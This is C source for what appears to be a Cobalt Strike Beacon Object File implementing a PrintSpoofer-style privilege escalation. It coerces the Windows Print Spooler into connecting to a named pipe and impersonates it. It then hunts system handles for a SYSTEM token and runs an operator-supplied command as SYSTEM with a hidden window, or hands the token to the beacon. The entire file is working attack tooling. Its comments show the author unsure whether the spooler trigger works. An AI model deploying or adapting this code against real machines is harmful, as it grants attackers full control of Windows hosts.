#include <windows.h> 
#include "beacon.h"
#include "def.h"

#define PIPE_NAME "printspoofer\\pipe\\spoolss"

LPCSTR g_clientName = "\\\\localhost\\pipe\\" PIPE_NAME;
LPCSTR g_serverName = "\\\\.\\pipe\\" PIPE_NAME;

typedef BOOL (WINAPI *pOpenPrinterW)(LPWSTR, LPHANDLE, LPVOID);
typedef BOOL (WINAPI *pRemoteFindFirstPrinterChangeNotificationEx)(HANDLE, DWORD, DWORD, LPWSTR, DWORD, LPVOID);

void TriggerSpooler() {
    HMODULE hWinspool = KERNEL32$LoadLibraryA("winspool.drv");
    if (!hWinspool) return;

    pOpenPrinterW fOpenPrinterW = (pOpenPrinterW)KERNEL32$GetProcAddress(hWinspool, "OpenPrinterW");
    pRemoteFindFirstPrinterChangeNotificationEx fRemote = (pRemoteFindFirstPrinterChangeNotificationEx)KERNEL32$GetProcAddress(hWinspool, "RemoteFindFirstPrinterChangeNotificationEx");

    if (fOpenPrinterW && fRemote) {
        HANDLE hPrinter = NULL;
        if (fOpenPrinterW(L"\\\\localhost", &hPrinter, NULL)) {
            // L"\\\\localhost\\pipe\\printspoofer" will result in Spooler connecting to \\localhost\pipe\printspoofer\pipe\spoolss
            fRemote(hPrinter, 0x00000100, 0, L"\\\\localhost\\pipe\\printspoofer", 0, NULL);
            KERNEL32$CloseHandle(hPrinter);
        }
    }
}

void go(LPSTR args, INT alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);
    char *command = BeaconDataExtract(&parser, NULL);
    BOOL interactive = BeaconDataInt(&parser);

    if (command && *command) {
        BeaconPrintf(CALLBACK_OUTPUT, "Target command: %s (Interactive: %s)\n", command, interactive ? "Yes" : "No");
    }

    HANDLE serverHandle = KERNEL32$CreateNamedPipeA(g_serverName, FILE_FLAG_FIRST_PIPE_INSTANCE | PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 0, 0, NMPWAIT_USE_DEFAULT_WAIT, NULL);
    if (serverHandle == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "CreateNamedPipeA: %d\n", KERNEL32$GetLastError());
        return;
    }

    // Trigger the spooler in a separate thread-like fashion or just before? 
    // In a BOF we are single threaded, but maybe it works if we trigger then wait.
    TriggerSpooler();

    // We still connect to it ourselves just in case, or to "prime" it
    HANDLE clientHandle = KERNEL32$CreateFileA(g_clientName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    
    BOOL connected = KERNEL32$ConnectNamedPipe(serverHandle, NULL);
    if (!connected && KERNEL32$GetLastError() != ERROR_PIPE_CONNECTED) {
        BeaconPrintf(CALLBACK_ERROR, "ConnectNamedPipe: %d\n", KERNEL32$GetLastError());
        if (clientHandle != INVALID_HANDLE_VALUE) KERNEL32$CloseHandle(clientHandle);
        KERNEL32$CloseHandle(serverHandle);
        return;
    }

    BOOL impersonated = ADVAPI32$ImpersonateNamedPipeClient(serverHandle);
    if (!impersonated) {
        BeaconPrintf(CALLBACK_ERROR, "ImpersonateNamedPipeClient: %d\n", KERNEL32$GetLastError());
        if (clientHandle != INVALID_HANDLE_VALUE) KERNEL32$CloseHandle(clientHandle);
        KERNEL32$CloseHandle(serverHandle);
        return;
    }

    DWORD len = sizeof(SYSTEM_HANDLE_INFORMATION) * 0x1000;
    PSYSTEM_HANDLE_INFORMATION shi = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, len);

    while (!NT_SUCCESS(NTDLL$NtQuerySystemInformation(SystemHandleInformation, shi, len, NULL))) {
        len += (sizeof(SYSTEM_HANDLE_INFORMATION) * 0x1000);
        shi = KERNEL32$HeapReAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, shi, len);
    }

    for (int i = 0; i < shi->NumberOfHandles; i++) {
        CLIENT_ID cid = {0};
        OBJECT_ATTRIBUTES att = {0};
        cid.UniqueProcess = (HANDLE)(UINT_PTR)shi->Handles[i].UniqueProcessId;

        InitializeObjectAttributes(&att, NULL, OBJ_CASE_INSENSITIVE, 0, 0);

        HANDLE processHandle = NULL;
        if (!NT_SUCCESS(NTDLL$NtOpenProcess(&processHandle, PROCESS_DUP_HANDLE, &att, &cid))) {
            continue;
        }

        HANDLE hDup = NULL;
        if (!NT_SUCCESS(NTDLL$NtDuplicateObject(processHandle, (HANDLE)(UINT_PTR)shi->Handles[i].HandleValue, (HANDLE)-1, &hDup, 0, 0, DUPLICATE_SAME_ACCESS))) {
            KERNEL32$CloseHandle(processHandle);
            continue;
        }

        TOKEN_STATISTICS tst = {0};
        if (!NT_SUCCESS(NTDLL$NtQueryInformationToken(hDup, TokenStatistics, &tst, sizeof(tst), &len))) {
            KERNEL32$CloseHandle(processHandle);
            KERNEL32$CloseHandle(hDup);
            continue;
        }

        LUID uid = {0};
        uid.LowPart = 0x3E7; // SYSTEM
        uid.HighPart = 0;
        if (tst.AuthenticationId.LowPart != uid.LowPart || tst.AuthenticationId.HighPart != uid.HighPart || tst.PrivilegeCount < 20) {
            KERNEL32$CloseHandle(processHandle);
            KERNEL32$CloseHandle(hDup);
            continue;
        }

        TOKEN_TYPE typ = 0;
        if (!NT_SUCCESS(NTDLL$NtQueryInformationToken(hDup, TokenType, &typ, sizeof(typ), &len))) {
            KERNEL32$CloseHandle(processHandle);
            KERNEL32$CloseHandle(hDup);
            continue;
        }

        if (typ == TokenPrimary) {
            KERNEL32$CloseHandle(processHandle);
            KERNEL32$CloseHandle(hDup);
            continue;
        }

        HANDLE sys = NULL;
        if (NT_SUCCESS(NTDLL$NtDuplicateObject(processHandle, (HANDLE)(UINT_PTR)shi->Handles[i].HandleValue, (HANDLE)-1, &sys, 0, 0, DUPLICATE_SAME_ACCESS))) {
            BeaconPrintf(CALLBACK_OUTPUT, "Success: Found SYSTEM token\n");
            
            if (command && *command) {
                // Execute command as SYSTEM
                HANDLE hPrimaryToken = NULL;
                if (ADVAPI32$DuplicateTokenEx(sys, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken)) {
                    BeaconPrintf(CALLBACK_OUTPUT, "Executing: %s\n", command);
                    
                    // Create capture pipes
                    HANDLE hRead, hWrite;
                    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
                    if (KERNEL32$CreatePipe(&hRead, &hWrite, &sa, 0)) {
                        STARTUPINFOW si = {0};
                        si.cb = sizeof(si);
                        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
                        si.wShowWindow = SW_HIDE;
                        si.hStdOutput = hWrite;
                        si.hStdError = hWrite;
                        
                        PROCESS_INFORMATION pi = {0};
                        
                        // Convert command to WCHAR
                        int wlen = MSVCRT$mbstowcs(NULL, command, 0);
                        WCHAR *wcmd = (WCHAR*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (wlen + 1) * sizeof(WCHAR));
                        MSVCRT$mbstowcs(wcmd, command, wlen);
                        
                        if (ADVAPI32$CreateProcessWithTokenW(hPrimaryToken, LOGON_WITH_PROFILE, NULL, wcmd, CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi)) {
                            KERNEL32$CloseHandle(hWrite);
                            
                            char buffer[4096];
                            DWORD bytesRead;
                            while (KERNEL32$ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
                                buffer[bytesRead] = '\0';
                                BeaconPrintf(CALLBACK_OUTPUT, "%s", buffer);
                            }
                            
                            KERNEL32$WaitForSingleObject(pi.hProcess, 10000);
                            KERNEL32$CloseHandle(pi.hProcess);
                            KERNEL32$CloseHandle(pi.hThread);
                        } else {
                            BeaconPrintf(CALLBACK_ERROR, "CreateProcessWithTokenW failed: %d\n", KERNEL32$GetLastError());
                        }
                        
                        KERNEL32$CloseHandle(hRead);
                        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, wcmd);
                    } else {
                        KERNEL32$CloseHandle(hWrite);
                    }
                    KERNEL32$CloseHandle(hPrimaryToken);
                } else {
                    BeaconPrintf(CALLBACK_ERROR, "DuplicateTokenEx failed: %d\n", KERNEL32$GetLastError());
                }
            } else {
                BeaconUseToken(sys);
            }
            
            KERNEL32$CloseHandle(sys);
            KERNEL32$CloseHandle(hDup);
            KERNEL32$CloseHandle(processHandle);
            KERNEL32$CloseHandle(serverHandle);
            if (clientHandle != INVALID_HANDLE_VALUE) KERNEL32$CloseHandle(clientHandle);
            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, shi);
            return;
        } 
        KERNEL32$CloseHandle(hDup);
        KERNEL32$CloseHandle(processHandle);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Failure: Could not find/duplicate a SYSTEM token.\n");
    
    if (shi != NULL) {
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, shi);
    }
    
    if (clientHandle != INVALID_HANDLE_VALUE) KERNEL32$CloseHandle(clientHandle);
    KERNEL32$CloseHandle(serverHandle);
}
